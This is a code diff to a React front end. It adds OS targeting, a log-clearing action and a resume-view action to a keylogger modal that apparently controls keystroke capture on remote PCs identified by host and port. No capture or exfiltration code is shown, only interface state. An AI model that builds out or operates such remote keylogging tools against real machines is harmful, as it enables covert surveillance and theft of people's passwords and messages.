@@ -553,6 +553,7 @@ function App() {
           <KeyloggerModal
               busy={keyloggerBusy}
               content={keyloggerContent}
+              targetOs={selectedPc?.os ?? 'Windows'}
               onClose={async () => {
                   if (selectedPc && keyloggerRunning) {
                       try {
@@ -565,15 +566,19 @@ function App() {
                   setKeyloggerRunning(false);
                   setKeyloggerContent('');
                   setKeyloggerLastLength(0);
+                  setKeyloggerViewCleared(false);
                   setKeyloggerOpen(false);
               }}
-              onRefresh={() => {
+              onClearLog={() => {
+                  setKeyloggerViewCleared(true);
                   setKeyloggerContent('');
                   setKeyloggerLastLength(0);
               }}
+              onResumeView={() => void refreshKeyloggerLog({ force: true })}
               onStart={() => void handleStartKeylogger()}
               open={keyloggerOpen}
               running={keyloggerRunning}
+              viewCleared={keyloggerViewCleared}
               targetLabel={
                   selectedPc ? `${selectedPc.name} (${selectedPc.host}:${selectedPc.port})` : 'No target'
               }
